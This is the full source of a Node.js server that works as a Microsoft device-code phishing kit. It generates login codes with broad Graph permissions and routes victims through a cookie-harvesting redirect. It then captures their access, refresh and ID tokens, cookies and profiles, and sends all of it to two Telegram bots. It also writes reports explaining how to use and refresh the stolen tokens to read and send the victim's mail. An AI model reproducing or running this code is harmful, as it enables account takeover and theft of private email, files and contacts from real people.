require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;

const app = express();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));

// ============================================================================
// ADVANCED CONFIGURATION
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    scope: [
      'openid', 'profile', 'email', 'offline_access',
      'User.Read', 'User.ReadBasic.All', 'User.ReadWrite',
      'Mail.Read', 'Mail.ReadWrite', 'Mail.Send',
      'Calendars.Read', 'Calendars.ReadWrite',
      'Contacts.Read', 'Contacts.ReadWrite',
      'Files.Read', 'Files.ReadWrite', 'Files.ReadWrite.All',
      'Sites.Read.All', 'Tasks.Read', 'Tasks.ReadWrite',
      'Notes.Read', 'Notes.ReadWrite',
      'People.Read', 'Presence.Read',
    ].join(' '),
  },
  telegram: {
    // PRIMARY BOT (Main reporting)
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
    // SECONDARY BOT (Backup reporting)
    botToken2: process.env.TELEGRAM_BOT_TOKEN_2,
    chatId2: process.env.TELEGRAM_CHAT_ID_2,
  },
  server: {
    port: process.env.PORT || 3000,
    // Flexible URL detection - works anywhere
    appUrl: process.env.APP_URL || 
            (process.env.RAILWAY_PUBLIC_DOMAIN 
              ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
              : (process.env.HEROKU_APP_NAME 
                  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`
                  : `http://localhost:${process.env.PORT || 3000}`)),
  },
  security: {
    encryptionKey: Buffer.from(
      process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
      'hex'
    ),
  },
  storage: {
    dataDir: path.join(__dirname, 'captured_data'),
    reportsDir: path.join(__dirname, 'captured_data', 'reports'),
    jsonDir: path.join(__dirname, 'captured_data', 'json'),
  }
};

if (!config.microsoft.clientId) {
  console.error('❌ MICROSOFT_CLIENT_ID required');
  process.exit(1);
}

// Create directories
(async () => {
  try {
    await fs.mkdir(config.storage.dataDir, { recursive: true });
    await fs.mkdir(config.storage.reportsDir, { recursive: true });
    await fs.mkdir(config.storage.jsonDir, { recursive: true });
    console.log('[STORAGE] Directories created');
  } catch (err) {
    console.error('[STORAGE] Error:', err.message);
  }
})();

// ============================================================================
// ENCRYPTION
// ============================================================================

class Encryption {
  static encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', config.security.encryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(data, 'utf8'), cipher.final()]);
    const authTag = cipher.getAuthTag();
    const hmac = crypto.createHmac('sha256', config.security.encryptionKey);
    hmac.update(encrypted);
    
    return {
      encrypted: encrypted.toString('hex'),
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      signature: hmac.digest('hex'),
      algorithm: 'AES-256-GCM',
    };
  }
}

// ============================================================================
// STORAGE
// ============================================================================

class Storage {
  static async saveJSON(filename, data) {
    try {
      const filepath = path.join(config.storage.jsonDir, `${filename}.json`);
      await fs.writeFile(filepath, JSON.stringify(data, null, 2), 'utf8');
      console.log(`[JSON] Saved: ${filename}.json`);
      return filepath;
    } catch (err) {
      console.error(`[JSON] Error:`, err.message);
      return null;
    }
  }

  static async saveReport(captureId, content) {
    try {
      const filepath = path.join(config.storage.reportsDir, `COMPLETE_REPORT_${captureId}.txt`);
      await fs.writeFile(filepath, content, 'utf8');
      console.log(`[TXT] Saved: COMPLETE_REPORT_${captureId}.txt`);
      return filepath;
    } catch (err) {
      console.error(`[TXT] Error:`, err.message);
      return null;
    }
  }

  static generateAdvancedReport(data) {
    const lines = [];
    const sep = '='.repeat(80);
    const subsep = '-'.repeat(80);
    
    lines.push(sep);
    lines.push('MICROSOFT TOKEN CAPTURE - COMPLETE ADVANCED REPORT');
    lines.push(sep);
    lines.push('');
    lines.push(`Capture ID: ${data.metadata.captureId}`);
    lines.push(`Timestamp: ${data.metadata.timestamp}`);
    lines.push(`Session ID: ${data.metadata.sessionId}`);
    lines.push(`Server URL: ${data.metadata.serverUrl}`);
    lines.push('');
    
    // ========================================================================
    // SECTION 1: CLIENT INFORMATION
    // ========================================================================
    lines.push(sep);
    lines.push('1. CLIENT INFORMATION');
    lines.push(sep);
    lines.push('');
    lines.push(`Application Client ID: ${data.clientInfo.applicationClientId}`);
    lines.push(`Tenant ID: ${data.clientInfo.tenantId}`);
    if (data.clientInfo.userClientId) {
      lines.push(`User Account Client ID: ${data.clientInfo.userClientId}`);
    }
    lines.push('');
    
    // ========================================================================
    // SECTION 2: ALL TOKENS (COMPLETE)
    // ========================================================================
    lines.push(sep);
    lines.push('2. ALL TOKENS - COMPLETE & UNTRUNCATED');
    lines.push(sep);
    lines.push('');
    
    // Access Token
    lines.push('2.1 ACCESS TOKEN (PLAINTEXT - FULL)');
    lines.push(subsep);
    lines.push(data.tokens.access.plaintext);
    lines.push('');
    lines.push(`Type: ${data.tokens.access.type}`);
    lines.push(`Length: ${data.tokens.access.length} characters`);
    lines.push(`Expires In: ${data.tokens.access.expiresIn} seconds`);
    lines.push(`Expires At: ${data.tokens.access.expiresAt}`);
    lines.push('');
    
    // Refresh Token
    if (data.tokens.refresh) {
      lines.push('2.2 REFRESH TOKEN (PLAINTEXT - FULL)');
      lines.push(subsep);
      lines.push(data.tokens.refresh.plaintext);
      lines.push('');
      lines.push(`Length: ${data.tokens.refresh.length} characters`);
      lines.push(`Potential PRT: ${data.tokens.refresh.isPotentialPRT ? 'YES' : 'NO'}`);
      lines.push('');
    }
    
    // ID Token
    if (data.tokens.id) {
      lines.push('2.3 ID TOKEN (PLAINTEXT - FULL)');
      lines.push(subsep);
      lines.push(data.tokens.id.plaintext);
      lines.push('');
    }
    
    // ========================================================================
    // SECTION 3: LOGIN PROCEDURES
    // ========================================================================
    lines.push(sep);
    lines.push('3. LOGIN PROCEDURES & TOKEN USAGE');
    lines.push(sep);
    lines.push('');
    
    lines.push('3.1 HOW TO LOGIN WITH ACCESS TOKEN');
    lines.push(subsep);
    lines.push('');
    lines.push('METHOD 1: Microsoft Graph API (Recommended)');
    lines.push('-------------------------------------------');
    lines.push('');
    lines.push('# Get user profile:');
    lines.push('curl -X GET "https://graph.microsoft.com/v1.0/me" \\');
    lines.push(`  -H "Authorization: Bearer ${data.tokens.access.plaintext.substring(0, 50)}..." \\`);
    lines.push('  -H "Content-Type: application/json"');
    lines.push('');
    lines.push('# Read emails:');
    lines.push('curl -X GET "https://graph.microsoft.com/v1.0/me/messages" \\');
    lines.push(`  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"`);
    lines.push('');
    lines.push('# Send email:');
    lines.push('curl -X POST "https://graph.microsoft.com/v1.0/me/sendMail" \\');
    lines.push(`  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \\`);
    lines.push('  -H "Content-Type: application/json" \\');
    lines.push('  -d \'{"message":{"subject":"Test","body":{"content":"Hello"},"toRecipients":[{"emailAddress":{"address":"recipient@example.com"}}]}}\'');
    lines.push('');
    lines.push('');
    
    lines.push('METHOD 2: Programmatic Access (Python)');
    lines.push('---------------------------------------');
    lines.push('');
    lines.push('import requests');
    lines.push('');
    lines.push(`access_token = "${data.tokens.access.plaintext.substring(0, 50)}..."`);
    lines.push('headers = {"Authorization": f"Bearer {access_token}"}');
    lines.push('');
    lines.push('# Get user info');
    lines.push('response = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)');
    lines.push('user = response.json()');
    lines.push('print(user)');
    lines.push('');
    lines.push('');
    
    lines.push('METHOD 3: Programmatic Access (JavaScript/Node.js)');
    lines.push('--------------------------------------------------');
    lines.push('');
    lines.push('const axios = require(\'axios\');');
    lines.push('');
    lines.push(`const accessToken = '${data.tokens.access.plaintext.substring(0, 50)}...';`);
    lines.push('');
    lines.push('// Get user info');
    lines.push('const response = await axios.get(\'https://graph.microsoft.com/v1.0/me\', {');
    lines.push('  headers: { \'Authorization\': `Bearer ${accessToken}` }');
    lines.push('});');
    lines.push('console.log(response.data);');
    lines.push('');
    lines.push('');
    
    if (data.tokens.refresh) {
      lines.push('3.2 HOW TO GET NEW ACCESS TOKEN FROM REFRESH TOKEN');
      lines.push(subsep);
      lines.push('');
      lines.push('METHOD 1: Using cURL');
      lines.push('--------------------');
      lines.push('');
      lines.push('curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \\');
      lines.push('  -H "Content-Type: application/x-www-form-urlencoded" \\');
      lines.push('  -d "client_id=' + data.clientInfo.applicationClientId + '" \\');
      lines.push('  -d "scope=User.Read offline_access" \\');
      lines.push('  -d "refresh_token=' + data.tokens.refresh.plaintext.substring(0, 50) + '..." \\');
      lines.push('  -d "grant_type=refresh_token"');
      lines.push('');
      lines.push('# Response will contain:');
      lines.push('# - access_token: New access token');
      lines.push('# - refresh_token: New refresh token (use this for next refresh)');
      lines.push('# - expires_in: Token validity in seconds');
      lines.push('');
      lines.push('');
      
      lines.push('METHOD 2: Using Python');
      lines.push('----------------------');
      lines.push('');
      lines.push('import requests');
      lines.push('');
      lines.push('data = {');
      lines.push(`    'client_id': '${data.clientInfo.applicationClientId}',`);
      lines.push('    \'scope\': \'User.Read offline_access\',');
      lines.push(`    'refresh_token': '${data.tokens.refresh.plaintext.substring(0, 50)}...',`);
      lines.push('    \'grant_type\': \'refresh_token\'');
      lines.push('}');
      lines.push('');
      lines.push('response = requests.post(');
      lines.push('    \'https://login.microsoftonline.com/common/oauth2/v2.0/token\',');
      lines.push('    data=data');
      lines.push(')');
      lines.push('');
      lines.push('tokens = response.json()');
      lines.push('new_access_token = tokens[\'access_token\']');
      lines.push('new_refresh_token = tokens[\'refresh_token\']');
      lines.push('');
      lines.push('print(f"New Access Token: {new_access_token}")');
      lines.push('print(f"New Refresh Token: {new_refresh_token}")');
      lines.push('');
      lines.push('');
      
      lines.push('METHOD 3: Using JavaScript/Node.js');
      lines.push('----------------------------------');
      lines.push('');
      lines.push('const axios = require(\'axios\');');
      lines.push('const qs = require(\'querystring\');');
      lines.push('');
      lines.push('const data = {');
      lines.push(`  client_id: '${data.clientInfo.applicationClientId}',`);
      lines.push('  scope: \'User.Read offline_access\',');
      lines.push(`  refresh_token: '${data.tokens.refresh.plaintext.substring(0, 50)}...',`);
      lines.push('  grant_type: \'refresh_token\'');
      lines.push('};');
      lines.push('');
      lines.push('const response = await axios.post(');
      lines.push('  \'https://login.microsoftonline.com/common/oauth2/v2.0/token\',');
      lines.push('  qs.stringify(data),');
      lines.push('  { headers: { \'Content-Type\': \'application/x-www-form-urlencoded\' } }');
      lines.push(');');
      lines.push('');
      lines.push('const newAccessToken = response.data.access_token;');
      lines.push('const newRefreshToken = response.data.refresh_token;');
      lines.push('');
      lines.push('console.log("New Access Token:", newAccessToken);');
      lines.push('console.log("New Refresh Token:", newRefreshToken);');
      lines.push('');
      lines.push('');
      
      lines.push('IMPORTANT NOTES:');
      lines.push('----------------');
      lines.push('1. Each refresh generates a NEW access token AND a NEW refresh token');
      lines.push('2. Always save the new refresh token for future use');
      lines.push('3. Old refresh tokens may become invalid after use');
      lines.push('4. Access tokens typically expire in 1 hour (3600 seconds)');
      lines.push('5. Refresh tokens can last up to 90 days');
      lines.push('6. Use the same client_id that was used for initial authentication');
      lines.push('');
    }
    
    // ========================================================================
    // SECTION 4: COOKIES
    // ========================================================================
    lines.push(sep);
    lines.push('4. ALL COOKIES CAPTURED');
    lines.push(sep);
    lines.push('');
    lines.push('Raw Cookie Header:');
    lines.push(data.cookies.all.rawCookieHeader || 'None');
    lines.push('');
    lines.push('All Cookies:');
    lines.push(JSON.stringify(data.cookies.all.cookies, null, 2));
    lines.push('');
    lines.push('Microsoft Cookies:');
    lines.push(JSON.stringify(data.cookies.microsoftCookies, null, 2));
    lines.push('');
    
    // ========================================================================
    // SECTION 5: USER PROFILE
    // ========================================================================
    lines.push(sep);
    lines.push('5. USER PROFILE');
    lines.push(sep);
    lines.push(JSON.stringify(data.user.profile, null, 2));
    lines.push('');
    
    // ========================================================================
    // SECTION 6: ENCRYPTED TOKENS
    // ========================================================================
    lines.push(sep);
    lines.push('6. ENCRYPTED TOKENS (AES-256-GCM)');
    lines.push(sep);
    lines.push('');
    lines.push('Access Token Encrypted:');
    lines.push(JSON.stringify(data.tokens.access.encrypted, null, 2));
    lines.push('');
    if (data.tokens.refresh) {
      lines.push('Refresh Token Encrypted:');
      lines.push(JSON.stringify(data.tokens.refresh.encrypted, null, 2));
      lines.push('');
    }
    
    // ========================================================================
    // SECTION 7: SUMMARY
    // ========================================================================
    lines.push(sep);
    lines.push('7. CAPTURE SUMMARY');
    lines.push(sep);
    lines.push(`✅ Application Client ID: ${data.clientInfo.applicationClientId}`);
    lines.push(`✅ Access Token: ${data.tokens.access ? 'CAPTURED' : 'NO'} (${data.tokens.access?.length || 0} chars)`);
    lines.push(`✅ Refresh Token: ${data.tokens.refresh ? 'CAPTURED' : 'NO'} (${data.tokens.refresh?.length || 0} chars)`);
    lines.push(`✅ ID Token: ${data.tokens.id ? 'CAPTURED' : 'NO'}`);
    lines.push(`✅ PRT: ${data.tokens.refresh?.isPotentialPRT ? 'DETECTED' : 'NO'}`);
    lines.push(`✅ Microsoft Cookies: ${Object.keys(data.cookies.microsoftCookies).length}`);
    lines.push(`✅ User Profile: ${data.user.profile && !data.user.profile.error ? 'CAPTURED' : 'FAILED'}`);
    lines.push('');
    lines.push(sep);
    lines.push('END OF REPORT');
    lines.push(sep);
    
    return lines.join('\n');
  }
}

// ============================================================================
// DUAL TELEGRAM SENDER
// ============================================================================

class DualTelegram {
  static async sendToAll(title, data) {
    // Send to primary bot
    await this.sendJSON(
      config.telegram.botToken,
      config.telegram.chatId,
      title,
      data,
      'PRIMARY'
    );
    
    // Send to secondary bot if configured
    if (config.telegram.botToken2 && config.telegram.chatId2) {
      await this.sendJSON(
        config.telegram.botToken2,
        config.telegram.chatId2,
        title,
        data,
        'SECONDARY'
      );
    }
  }

  static async sendJSON(botToken, chatId, title, data, label) {
    if (!botToken || !chatId) {
      console.log(`[TELEGRAM ${label} DISABLED] ${title}`);
      return;
    }

    try {
      const jsonStr = JSON.stringify(data, null, 2);
      const chunks = this.splitChunks(jsonStr, 3800);
      
      for (let i = 0; i < chunks.length; i++) {
        const text = i === 0 
          ? `${title}\n${'━'.repeat(30)}\n\`\`\`json\n${chunks[i]}\n\`\`\``
          : `${title} (Part ${i + 1})\n\`\`\`json\n${chunks[i]}\n\`\`\``;

        await axios.post(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          { chat_id: chatId, text, parse_mode: 'Markdown' },
          { timeout: 10000 }
        );

        if (i < chunks.length - 1) await this.sleep(1000);
      }

      console.log(`[TELEGRAM ${label}] ✅ ${title} (${chunks.length} parts)`);
    } catch (error) {
      console.error(`[TELEGRAM ${label}] ❌ ${title}:`, error.message);
    }
  }

  static async sendFileToAll(filepath, caption) {
    // Send to primary
    await this.sendFile(
      config.telegram.botToken,
      config.telegram.chatId,
      filepath,
      caption,
      'PRIMARY'
    );
    
    // Send to secondary
    if (config.telegram.botToken2 && config.telegram.chatId2) {
      await this.sendFile(
        config.telegram.botToken2,
        config.telegram.chatId2,
        filepath,
        caption,
        'SECONDARY'
      );
    }
  }

  static async sendFile(botToken, chatId, filepath, caption, label) {
    if (!botToken || !chatId) return;

    try {
      const FormData = require('form-data');
      const form = new FormData();
      
      form.append('chat_id', chatId);
      form.append('document', await fs.readFile(filepath), {
        filename: path.basename(filepath),
      });
      if (caption) form.append('caption', caption);

      await axios.post(
        `https://api.telegram.org/bot${botToken}/sendDocument`,
        form,
        { 
          headers: form.getHeaders(),
          timeout: 30000,
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
        }
      );

      console.log(`[TELEGRAM ${label}] ✅ File: ${path.basename(filepath)}`);
    } catch (error) {
      console.error(`[TELEGRAM ${label}] ❌ File:`, error.message);
    }
  }

  static splitChunks(text, size) {
    const chunks = [];
    for (let i = 0; i < text.length; i += size) {
      chunks.push(text.substring(i, i + size));
    }
    return chunks;
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// ============================================================================
// COOKIE EXTRACTOR
// ============================================================================

function extractCookies(req) {
  const allCookies = req.cookies || {};
  const rawHeader = req.headers.cookie || '';
  
  const microsoftPatterns = [
    'msal', 'ms', 'aad', 'azure', 'graph', 'office', 'outlook',
    'login', 'auth', 'sso', 'estsauth', 'buid', 'MUID',
  ];
  
  const filterCookies = (patterns) => {
    return Object.keys(allCookies)
      .filter(key => patterns.some(pattern => 
        key.toLowerCase().includes(pattern.toLowerCase())
      ))
      .reduce((obj, key) => {
        obj[key] = allCookies[key];
        return obj;
      }, {});
  };
  
  return {
    all: {
      cookies: allCookies,
      signedCookies: req.signedCookies || {},
      rawCookieHeader: rawHeader,
      headers: {
        userAgent: req.headers['user-agent'],
        acceptLanguage: req.headers['accept-language'],
        accept: req.headers['accept'],
        referer: req.headers.referer,
        origin: req.headers.origin,
        host: req.headers.host,
      },
      ip: req.ip || req.connection.remoteAddress,
      timestamp: new Date().toISOString(),
    },
    microsoftCookies: filterCookies(microsoftPatterns),
  };
}

// ============================================================================
// JWT DECODER
// ============================================================================

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    
    return {
      header: JSON.parse(Buffer.from(parts[0], 'base64').toString()),
      payload: JSON.parse(Buffer.from(parts[1], 'base64').toString()),
      signature: parts[2],
    };
  } catch {
    return null;
  }
}

// ============================================================================
// CLIENT ID EXTRACTOR
// ============================================================================

function extractClientIds(tokenData, decodedTokens) {
  const clientInfo = {
    applicationClientId: config.microsoft.clientId,
    tenantId: config.microsoft.tenantId,
    userClientId: null,
  };
  
  // Try to extract user's client ID from token claims
  if (decodedTokens.access?.payload) {
    clientInfo.userClientId = decodedTokens.access.payload.app_id || 
                               decodedTokens.access.payload.appid ||
                               decodedTokens.access.payload.azp ||
                               decodedTokens.access.payload.client_id;
  }
  
  return clientInfo;
}

// ============================================================================
// STORAGE
// ============================================================================

const sessions = new Map();
const cookieStore = new Map();

// ============================================================================
// MS ENDPOINTS
// ============================================================================

const MS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
};

// ============================================================================
// ADVANCED CAPTURE ENGINE
// ============================================================================

async function captureAdvanced(tokenData, sessionId, userCode, cookieData) {
  console.log('\n🚀 ADVANCED CAPTURE WITH CLIENT ID');

  const captureId = crypto.randomUUID();
  const timestamp = new Date().toISOString();

  const accessToken = tokenData.access_token;
  const refreshToken = tokenData.refresh_token;
  const idToken = tokenData.id_token;
  
  const hasPRT = refreshToken && refreshToken.length > 500;

  console.log(`[TOKENS] Access: ${accessToken?.length || 0} | Refresh: ${refreshToken?.length || 0}`);

  // Get user
  let user = null;
  try {
    const res = await axios.get(MS.userInfo, {
      headers: { Authorization: `Bearer ${accessToken}` },
      timeout: 10000,
    });
    user = res.data;
    console.log(`[USER] ${user.displayName}`);
  } catch (err) {
    user = { error: err.message };
  }

  // Decode
  const decoded = {
    access: decodeJWT(accessToken),
    refresh: refreshToken ? decodeJWT(refreshToken) : null,
    id: idToken ? decodeJWT(idToken) : null,
  };

  // Extract client IDs
  const clientInfo = extractClientIds(tokenData, decoded);
  console.log(`[CLIENT] App: ${clientInfo.applicationClientId} | User: ${clientInfo.userClientId || 'N/A'}`);

  // Encrypt
  const encrypted = {
    access: Encryption.encrypt(accessToken),
    refresh: refreshToken ? Encryption.encrypt(refreshToken) : null,
    id: idToken ? Encryption.encrypt(idToken) : null,
  };

  // Build capture
  const capture = {
    metadata: {
      captureId,
      sessionId,
      userCode,
      timestamp,
      version: '5.0-ADVANCED',
      serverUrl: config.server.appUrl,
    },

    clientInfo,

    tokens: {
      access: {
        plaintext: accessToken,
        encrypted: encrypted.access,
        length: accessToken.length,
        type: tokenData.token_type || 'Bearer',
        expiresIn: tokenData.expires_in,
        expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString(),
        decoded: decoded.access,
      },
      
      refresh: refreshToken ? {
        plaintext: refreshToken,
        encrypted: encrypted.refresh,
        length: refreshToken.length,
        decoded: decoded.refresh,
        isPotentialPRT: hasPRT,
      } : null,

      id: idToken ? {
        plaintext: idToken,
        encrypted: encrypted.id,
        length: idToken.length,
        decoded: decoded.id,
      } : null,
    },

    cookies: cookieData,

    scopes: {
      granted: tokenData.scope ? tokenData.scope.split(' ') : [],
      count: tokenData.scope ? tokenData.scope.split(' ').length : 0,
    },

    user: {
      profile: user,
      claims: {
        fromAccessToken: decoded.access?.payload || {},
        fromIdToken: decoded.id?.payload || {},
      },
    },
  };

  // Save
  await Storage.saveJSON(`complete_${captureId}`, capture);
  const reportContent = Storage.generateAdvancedReport(capture);
  const reportPath = await Storage.saveReport(captureId, reportContent);

  // Send to DUAL Telegram
  await DualTelegram.sendToAll('📊 *CAPTURE SUMMARY*', {
    captureId,
    timestamp,
    clientInfo: {
      applicationClientId: clientInfo.applicationClientId,
      userClientId: clientInfo.userClientId || 'Not detected',
    },
    tokens: {
      access: '✅ CAPTURED',
      refresh: refreshToken ? '✅ CAPTURED' : '❌',
      id: idToken ? '✅ CAPTURED' : '❌',
      prt: hasPRT ? '✅ DETECTED' : '❌',
    },
  });

  await DualTelegram.sendToAll('🔓 *ACCESS TOKEN - FULL*', {
    captureId,
    token: accessToken,
    metadata: {
      type: tokenData.token_type,
      length: accessToken.length,
      expiresIn: tokenData.expires_in,
    }
  });

  if (refreshToken) {
    await DualTelegram.sendToAll('🔄 *REFRESH TOKEN - FULL*', {
      captureId,
      token: refreshToken,
      length: refreshToken.length,
      isPotentialPRT: hasPRT,
    });
  }

  if (idToken) {
    await DualTelegram.sendToAll('🆔 *ID TOKEN - FULL*', {
      captureId,
      token: idToken,
    });
  }

  await DualTelegram.sendToAll('🔐 *ENCRYPTED TOKENS*', {
    captureId,
    access: encrypted.access,
    refresh: encrypted.refresh,
    id: encrypted.id,
  });

  await DualTelegram.sendToAll('🍪 *ALL COOKIES*', cookieData);

  await DualTelegram.sendToAll('👤 *USER PROFILE*', {
    captureId,
    user: capture.user,
  });

  await DualTelegram.sendToAll('🔑 *CLIENT IDs*', {
    captureId,
    clientInfo,
  });

  if (reportPath) {
    await DualTelegram.sendFileToAll(reportPath, `📄 Complete Report - ${captureId}`);
  }

  const jsonPath = path.join(config.storage.jsonDir, `complete_${captureId}.json`);
  await DualTelegram.sendFileToAll(jsonPath, `📊 JSON - ${captureId}`);

  console.log(`✅ ADVANCED CAPTURE COMPLETE - ${captureId}\n`);

  return { user, captureId, hasPRT, clientInfo };
}

// ============================================================================
// PROXY
// ============================================================================

app.get('/auth/device', async (req, res) => {
  try {
    const { code } = req.query;
    if (!code) return res.status(400).send('Code required');

    const cookieData = extractCookies(req);
    cookieStore.set(code, cookieData);

    res.cookie('device_code', code, { 
      maxAge: 900000, 
      httpOnly: true,
      secure: config.server.appUrl.startsWith('https'),
    });

    res.redirect(302, `https://microsoft.com/devicelogin?otc=${code}`);
  } catch (error) {
    console.error('[PROXY]:', error.message);
    res.status(500).send('Error');
  }
});

// ============================================================================
// API ENDPOINTS
// ============================================================================

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Get server config (for flexible frontend)
app.get('/api/config', (req, res) => {
  res.json({
    serverUrl: config.server.appUrl,
    version: '5.0',
  });
});

app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    const cookieData = extractCookies(req);

    const response = await axios.post(
      MS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const data = response.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
      cookieData,
    });

    console.log(`[GENERATE] ${data.user_code}`);

    DualTelegram.sendToAll('🔐 *CODE GENERATED*', {
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (error) {
    console.error('[GENERATE]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ error: 'Not found' });
    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
      return res.json({ status: 'expired' });
    }

    try {
      const tokenResponse = await axios.post(
        MS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: session.deviceCode,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );

      const tokenData = tokenResponse.data;
      console.log(`[SUCCESS] ${sessionId}`);

      const cookieData = cookieStore.get(session.userCode) || session.cookieData;
      const result = await captureAdvanced(tokenData, sessionId, session.userCode, cookieData);

      sessions.delete(sessionId);
      cookieStore.delete(session.userCode);

      res.json({
        status: 'authenticated',
        user: result.user && !result.user.error ? {
          id: result.user.id,
          displayName: result.user.displayName,
          email: result.user.mail || result.user.userPrincipalName,
        } : null,
        captureId: result.captureId,
        clientInfo: result.clientInfo,
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      }
      if (error.response?.data?.error === 'authorization_declined') {
        return res.json({ status: 'declined' });
      }
      if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      }
      throw error;
    }

  } catch (error) {
    console.error('[POLL]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    version: '5.0-ADVANCED',
    serverUrl: config.server.appUrl,
    dualTelegram: !!(config.telegram.botToken2 && config.telegram.chatId2),
    timestamp: new Date().toISOString() 
  });
});

// ============================================================================
// START
// ============================================================================

app.listen(config.server.port, async () => {
  console.log('\n' + '='.repeat(70));
  console.log('⚡ ADVANCED TOKEN CAPTURE SYSTEM v5.0');
  console.log('='.repeat(70));
  console.log(`📡 Port: ${config.server.port}`);
  console.log(`🌐 URL: ${config.server.appUrl}`);
  console.log(`💾 Storage: ${config.storage.dataDir}`);
  console.log(`📱 Primary Telegram: ${config.telegram.botToken ? '✅' : '❌'}`);
  console.log(`📱 Secondary Telegram: ${config.telegram.botToken2 ? '✅' : '❌'}`);
  console.log('='.repeat(70));
  console.log('\n🚀 NEW FEATURES:');
  console.log('   ✅ Client ID Capture');
  console.log('   ✅ Dual Telegram Reporting');
  console.log('   ✅ Login Procedures in TXT');
  console.log('   ✅ Token Refresh Guide');
  console.log('   ✅ Flexible Hosting (Works Anywhere)');
  console.log('='.repeat(70) + '\n');

  if (config.telegram.botToken) {
    await DualTelegram.sendToAll('⚡ *SYSTEM ONLINE v5.0*', {
      status: 'operational',
      url: config.server.appUrl,
      dualTelegram: !!(config.telegram.botToken2 && config.telegram.chatId2),
      timestamp: new Date().toISOString(),
    });
  }
});

module.exports = app;
